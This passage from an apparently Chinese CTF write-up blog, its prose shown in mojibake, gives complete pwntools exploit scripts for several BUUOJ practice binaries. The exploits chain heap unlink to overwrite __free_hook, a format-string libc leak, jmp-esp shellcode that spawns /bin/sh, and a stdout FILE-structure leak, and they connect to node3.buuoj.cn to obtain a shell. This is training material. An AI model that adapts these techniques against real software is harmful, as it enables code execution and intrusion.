class="hljs-number">0xffcca300</span> --&gt; <span class="hljs-number">0x8048670</span> --&gt; <span class="hljs-number">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div><p>è¿™å°±å˜æˆäº†ï¼Œè‡ªå·±ç†Ÿæ‚‰çš„<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn <span class="hljs-built_in">import</span> *<span class="hljs-built_in">import</span> time<span class="hljs-attr">local_file</span>  = './wustctf2020_getshell_2'<span class="hljs-attr">elf</span> = ELF(local_file)context.<span class="hljs-attr">log_level</span> = 'debug'<span class="hljs-attr">debug</span> = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    <span class="hljs-attr">io</span> = process(local_file)    <span class="hljs-attr">libc</span> = elf.libc<span class="hljs-keyword">else</span>:    <span class="hljs-attr">io</span> = remote('node3.buuoj.cn',<span class="hljs-number">25032</span>)    <span class="hljs-attr">libc</span> = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.<span class="hljs-attr">arch</span> = elf.archcontext.<span class="hljs-attr">terminal</span> = ['tmux','neww']<span class="hljs-attr">offset</span> = <span class="hljs-number">28</span><span class="hljs-attr">sh</span> = elf.search('sh\x00').next()<span class="hljs-attr">system</span> = <span class="hljs-number">0</span>x8048529<span class="hljs-attr">payload</span> = 'a' * offset + p32(system) + p32(sh)s(payload)itr()</code></pre></div><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="åˆ†æ-16"><a href="#åˆ†æ-16" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚</p><h4 id="æ¼æ´ç‚¹-2"><a href="#æ¼æ´ç‚¹-2" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„æ¼å‡ºç¨‹åºå’Œlibcçš„åŸºå€</li><li>editå‡½æ•°ä¸­ï¼Œé”™è¯¯çš„sizeé€‰å–ï¼Œå¯¼è‡´æ¯æ¬¡å¯ä»¥å¤šæº¢å‡º0x10çš„å­—èŠ‚ï¼Œå¨åŠ›å°±å¾ˆå¤§äº†ï¼Œprev sizeä¸ sizeéƒ½å¯ä»¥æ”¹åˆ°ã€‚</li></ul><p>ç›´æ¥è¿›è¡Œunlinkæ”»å‡»å³å¯ã€‚ä¼°è®¡å°±æ˜¯è€ƒè¿™ä¸ªçš„ï¼Œç¨‹åºé™åˆ¶äº†ä¸èƒ½ç”³è¯·0x80ä»¥ä¸‹çš„å †å—ï¼Œä¸”keyå€¼åŸºæœ¬æ²¡åŠæ³•æ”¹åˆ°ã€‚</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./axb_2019_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26837</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'(0-10)'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sla(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'content'</span>,str(data))payload = <span class="hljs-string">'%15$p'</span> + <span class="hljs-string">'%11$p'</span>sla(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">'Hello, 0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x20830</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'0x'</span>)bin_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x1186</span>info_addr(<span class="hljs-string">'bin_base'</span>,bin_base)note = bin_base + <span class="hljs-number">0x202060</span>key = bin_base + <span class="hljs-number">0x202040</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)edit(<span class="hljs-number">0</span>,payload)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(free_hook) + p64(<span class="hljs-number">0x88</span>)edit(<span class="hljs-number">0</span>,payload)rec = rce16[<span class="hljs-number">1</span>] + libc_baseedit(<span class="hljs-number">0</span>,p64(rec))free(<span class="hljs-number">2</span>)itr()</code></pre></div><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="åˆ†æ-17"><a href="#åˆ†æ-17" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°ä¸­ï¼Œæœ‰ä¸ªå¤§å¨åŠ›çš„å †æº¢å‡ºã€‚<br>ç”¨unlinkæ”»å‡»ã€‚</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bamboobox'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26818</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))note = <span class="hljs-number">0x006020C0</span> + <span class="hljs-number">8</span>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)edit(<span class="hljs-number">0</span>,len(payload),payload)free(<span class="hljs-number">1</span>)show()ru(<span class="hljs-string">'0 : '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c48e0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basepayload = p64(libc_base + <span class="hljs-number">0x3c48e0</span>) + p64(<span class="hljs-number">0</span>)  + p64(<span class="hljs-number">0x88</span>) + p64(free_hook)edit(<span class="hljs-number">0</span>,len(payload),payload)rec = rce16[<span class="hljs-number">1</span>] + libc_baseedit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(rec))free(<span class="hljs-number">2</span>)itr()</code></pre></div><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="åˆ†æ-18"><a href="#åˆ†æ-18" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å…³ï¼Œç›®æ ‡å®šä½ç€shellcodeå»ã€‚</p><h4 id="æ¼æ´ç‚¹-3"><a href="#æ¼æ´ç‚¹-3" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>æ ˆæº¢å‡ºï¼Œå¯ä»¥æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯32ä½ç¨‹åºç”¨ropå°±å¯ä»¥æ‰“äº†ã€‚ä½†æ˜¯ä¸ºç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ã€‚</p><div class="hljs"><pre><code class="hljs python">.text:<span class="hljs-number">08048551</span>             hint            proc near.text:<span class="hljs-number">08048551</span>             ; __unwind &#123;.text:<span class="hljs-number">08048551</span> <span class="hljs-number">55</span>                          push    ebp.text:<span class="hljs-number">08048552</span> <span class="hljs-number">89</span> E5                       mov     ebp, esp.text:<span class="hljs-number">08048554</span> FF E4                       jmp     esp.text:<span class="hljs-number">08048554</span>             hint            endp</code></pre></div><p>åœ¨é¢˜ç›®å½“ä¸­ï¼Œæœ‰ä¸ªhintå‡½æ•°ï¼Œå°±æ˜¯ç»™æç¤ºçš„ï¼Œæç¤ºåˆ°<code>jmp esp</code> è¿™ä¸ªgadgetã€‚</p><p>å…¶ä¸­ï¼Œå¯ä»¥æƒ³åˆ°åœ¨æ ˆæº¢å‡ºä¸­ï¼Œæœ‰ç»™<code>ret addr</code>å¡«ä¸Š<code>jmp esp</code> ï¼Œåœ¨æ¥ä¸Šshellcodeã€‚è¿™åº”è¯¥æ˜¯å¾ˆç»å…¸çš„ç”¨æ³•ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>æ„é€ æ€è·¯ï¼š</p><div class="hljs"><pre><code class="hljs undefined">Payload = overflow + jmp esp<span class="hljs-built_in"> address </span>+ shellcode</code></pre></div><p>ä½†æ˜¯è¿™ä¸ªé¢˜å°±æ˜¯åªèƒ½æº¢å‡º14å­—èŠ‚ï¼Œè¿”å›åœ°å€å†å ç”¨4å­—èŠ‚ï¼Œåº”è¯¥æ²¡æœ‰10å­—èŠ‚è¿™æ ·å°‘çš„shellcodeã€‚</p><p>æ‰€ä»¥è½¬å˜ä¸€ä¸‹ï¼Œæ ˆä¸Šå¡«å……å¥½shellcodeï¼Œç„¶å<code>jmp esp address</code>ï¼Œæ¥ç€è®©å…¶æ‰§è¡Œ<code>sub esp,0x28</code>ï¼Œç„¶ååœ¨è·³è½¬espã€‚</p><div class="hljs"><pre><code class="hljs undefined">Payload = shellcode + jmp esp<span class="hljs-built_in"> address </span>+ sub esp,esp + jmp esp</code></pre></div><p>å…¶å®åŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåé¢è·Ÿä¸Šçš„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºè°ƒæ•´espæŒ‡é’ˆçš„shellcodeã€‚</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_s_9'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26283</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()jmp_esp = <span class="hljs-number">0x08048554</span>shellcode= <span class="hljs-string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>shellcode = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">'\x00'</span>)gadgets = asm(<span class="hljs-string">'sub esp,0x28;jmp esp'</span>)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets<span class="hljs-comment"># debug()</span>sl(payload)itr()</code></pre></div><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="åˆ†æ-19"><a href="#åˆ†æ-19" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="æ¼æ´ç‚¹-4"><a href="#æ¼æ´ç‚¹-4" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>ç¨‹åºç”¨reallocå‡½æ•°æ¥åˆ†é…å †å—ï¼Œå› ä¸ºä¸ç†Ÿæ‚‰è¿™ä¸ªæçš„æˆ‘ï¼Œå¥½ä¹…æ²¡æœ‰åšå‡ºæ¥ã€‚</p><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><h4 id="reallocçš„ç‰¹ç‚¹"><a href="#reallocçš„ç‰¹ç‚¹" class="headerlink" title="reallocçš„ç‰¹ç‚¹"></a>reallocçš„ç‰¹ç‚¹</h4><p>åŸºç¡€åŠŸèƒ½æ˜¯æ”¹å˜<code>mem_address</code>æ‰€æŒ‡å†…å­˜åŒºåŸŸçš„å¤§å°ä¸ºnewsizeé•¿åº¦ã€‚è¿™é‡Œå°±æœ‰å‡ ç§ä¸åŒçš„æƒ…å†µ</p><ul><li>1.å½“sizeä¸º0ï¼Œè¿™æ—¶å°±ç›¸å½“äºfree()å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºnull</li><li>2.å½“æŒ‡é’ˆä¸º0ï¼Œsizeå¤§äº0ï¼Œç›¸å½“äºmallocå‡½æ•°</li><li>3.sizeå°äºç­‰äºåŸæ¥çš„sizeï¼Œåˆ™åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šç¼©å°ï¼Œå¤šä½™çš„å †å—freeæ‰</li><li>4.sizeå¤§äºåŸæ¥çš„sizeï¼Œå¦‚æœ<strong>æœ‰è¶³å¤Ÿç©ºé—´</strong>å°±åŸåŸºç¡€æ‰©å……ï¼Œç©ºé—´ä¸è¶³åˆ™åˆ†é…æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸæ¥æŒ‡é’ˆæŒ‡å‘çš„å †å—æ—§å†…å®¹å¤åˆ¶åˆ°æ–°çš„å †å—å†…å­˜ä¸­ï¼Œç„¶åå†å°†åŸæ¥çš„å †å—freeæ‰ã€‚</li></ul><p>å…¶ä¸­ç¬¬4ç‚¹ï¼Œæœ‰è¶³å¤Ÿç©ºé—´ï¼Œç”»å›¾è§£é‡Šä¸€ä¸‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>ç”±äºè¿™ä¸ªç‰¹æ€§ï¼Œæ¥åˆ¶ä½œ3ä¸ªå †å—Aã€Bã€Cï¼ŒBå †å—ä½œä¸ºè¿›å…¥unsortbinçš„å †å—å­˜åœ¨ï¼ŒCæ˜¯ä¸ºäº†é˜²æ­¢ä¸è®©Cåˆå¹¶top chunkï¼Œç„¶åç”¨Aæ¥ç”³è¯·ä¸€ä¸ªsize&lt;=ï¼ˆAçš„size + Bçš„sizeï¼‰çš„å †å—ï¼Œè¿™æ ·å°±é€ æˆäº†å †å—çš„é‡å ã€‚</p><h4 id="åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯"><a href="#åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯" class="headerlink" title="åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯"></a><code>åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯</code></h4><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>è¿™ä¸ªé¢˜å› ä¸ºæœ‰è¿‡è¾“å‡ºï¼Œå…¶<code>_IO_CURRENTLY_PUTTING</code>å°±æ˜¯ä¸º1çš„ ï¼Œå¯¹äº<code>_IO_IS_APPENDING</code>è¿™ä¸ªflagçš„å€¼ï¼Œå°†è¿™ä¸ªflagææˆ1ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹<code>_IO_buf_base</code>æ¥å®Œæˆleakã€‚</p><p>åœ¨èµ›é¢˜ä¸­ï¼Œå¾ˆå¤šç¨‹åºéƒ½æ˜¯ç”¨è¿‡è¾“å‡ºå‡½æ•°è¿›è¡Œè¾“å‡ºçš„ï¼ŒåŸºæœ¬å°±æ˜¯æ”¹æ‰flagï¼Œä¸­é—´çš„ä¸‰ä¸ªå˜é‡åœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­éƒ½ä¸æ€ä¹ˆç”¨å¾—åˆ°ï¼Œç›´æ¥ç›–æˆ0,ä½ä½è¦†ç›–<code>_IO_buf_base</code>ä¸ºåˆé€‚çš„å€¼å°±å¯ä»¥å®Œæˆleakã€‚</p><p>Flag æ€ä¹ˆè®¾ç½®ï¼Œåœ¨èµ›é¢˜ä¸­è¿˜æ˜¯å¾ˆéšæ„çš„ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0xfbad1887</span><span class="hljs-number">0xfbad3c80</span></code></pre></div><p>é‡ç‚¹å°±æ˜¯è®©<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>å¤§ä½“çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯åˆ©ç”¨unsorted binçš„åœ¨tcacheæˆ–fastbinçš„fdä¸Šç•™ä¸‹<code>main_arena</code>çš„åœ°å€ï¼Œç”±äº<code>_IO_2_1_stdout_</code>ä¸<code>arena</code>åªç›¸å·®4ä½ï¼Œä¸”ä½ä¸‰ä½å·²çŸ¥ï¼Œåœ¨ä¼ å…¥æ˜¯ä½3ä½è¦†ç›–fdç•™ä¸‹çš„<code>main_arena</code>çš„åœ°å€ï¼Œå‰©ä½™ä¸€ä½å¯ä»¥çˆ†ç ´ï¼Œæ¦‚ç‡1/16,ä»è€ŒåŠ«æŒstdoutä»¥è¾¾åˆ°æ³„éœ²çš„ç›®çš„ ã€‚</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./roarctf_2019_realloc_magic'</span>elf = ELF(local_file)<span class="hljs-comment"># context.log_level = 'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)    libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'?'</span>,str(size))    <span class="hljs-keyword">if</span> int(size) != <span class="hljs-number">0</span> :        sa(<span class="hljs-string">'?'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'aaaaaaa'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'aaaaaaaa'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)    add(<span class="hljs-number">0x110</span>,<span class="hljs-string">' '</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'a'</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):        free()    add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x60\x87'</span>)    payload = <span class="hljs-number">17</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span 